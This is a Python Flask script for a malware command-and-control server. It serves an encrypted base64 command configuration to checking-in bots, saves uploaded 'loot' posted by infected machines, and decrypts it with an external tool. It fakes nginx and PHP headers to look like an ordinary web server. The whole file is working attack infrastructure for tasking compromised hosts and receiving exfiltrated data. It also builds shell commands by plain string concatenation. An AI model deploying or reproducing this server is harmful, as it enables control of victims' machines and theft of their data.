#!/usr/bin/env python3

import os
import time
import argparse
from flask import Flask
from flask import Response
from flask import request

config = "enhFA1kHQHsAaWUDW3xQARQWMHckfzwHbgdlBVhjWAhlf0McWmkuDnQUHX8nEj5ROzkQUxxXLhV2ChVwKAgzbxRjWl4HUV1gHywsRkYSPncZCDZwLWQuFRQ5JEIOLBVRbhYrdTp3Mwh0CgttWhI+dxkINnAtZC4VAGhmBjUSJXUHADl/N2kVL0IzIF0aEhVIPxYrdTp3Mwh0CgttQGMVSD9lK20vZDAIcx0GbTVoFEMuOwRAB1AYJlR9CHYPPgpEJDkrbS9kMAhzHQZtNX0+bwwbNXAqcyMVbmlhAjUSJXUHADl/N2kuFXUdGHsnAD5vFBYwdyR/PAduBw=="

parser = argparse.ArgumentParser()
parser.add_argument("--path",
                    type=str,
                    required=True,
                    help="C2 File Path")
parser.add_argument("-k",
                    "--key",
                    required=True,
                    type=str,
                    help="C2 Crypt Key")
parser.add_argument("-d",
                    "--debug",
                    action='store_true',
                    help="Debug Mode",
                    default=False)
parser.add_argument("-p",
                    "--port",
                    type=int,
                    help="C2 Port",
                    default=80)
parser.add_argument("--header-server",
                    type=str,
                    default="nginx/1.14.1",
                    help="C2 Server Response Header")
parser.add_argument("--header-x-powered-by",
                    type=str,
                    default="PHP/7.1.29",
                    help="C2 Server Default X-Powered-By Header")
parser.add_argument("-c",
                    "--config",
                    type=str,
                    default=None,
                    help="C2 Server Command Configuration File (Encrypted / Base64)")
parser.add_argument("-o",
                    "--output",
                    type=str,
                    default=os.getcwd(),
                    help="Output Folder for Loot")
args = parser.parse_args()

if os.path.isdir(args.output) != True:
        print("Error: Output Folder for Loot does not exist...")

def main():
        if args.config != None:
                f = open(args.config, 'r')
                config = f.read()
                f.close()

        app = Flask(__name__)
        # '/BOH9KGa4jvUsU4jL/gate.php'

        @app.after_request
        def after_request(response):
                response.headers['Server'] = args.header_server
                response.headers['X-Powered-By'] = args.header_x_powered_by
                return response

        @app.route(args.path, methods=['GET'])
        def checkin():
                resp = Response(config)
                resp.headers['Content-Type'] = 'text/html; charset=UTF-8'
                return resp

        @app.route(args.path, methods=['POST'])
        def exfiltrate():
                date = time.strftime("%Y-%m-%dT%H:%M:%S")
                encrypted_filename = 'encrypted-' + date + '.bin'
                encrypted_filepath = os.path.join(args.output, encrypted_filename)
                decrypted_filename = 'decrypted-' + date + '.bin'
                decrypted_filepath = os.path.join(args.output, decrypted_filename)
                fp = open(encrypted_filepath, 'wb')
                fp.write(request.
                         data)
                fp.close()
                if args.debug == True:
                        os.system('kp2dc --crypt-file -k ' + args.key + ' -i ' + encrypted_filepath + ' -o ' + decrypted_filepath)
                else:
                        os.system('kp2dc --crypt-file -k ' + args.key + ' -i ' + encrypted_filepath + ' -o ' + decrypted_filepath)
                # if args.debug == True:
                #         os.system('hexdump -C decrypted-' + date + '.bin')
                resp = Response('OK')
                resp.headers['Server'] = 'nginx/1.14.1'
                resp.headers['X-Powered-By'] = 'PHP/7.1.1.29'
                return resp
        app.run(host='0.0.0.0', debug=args.debug, port=args.port)

if __name__ == '__main__':
        main()
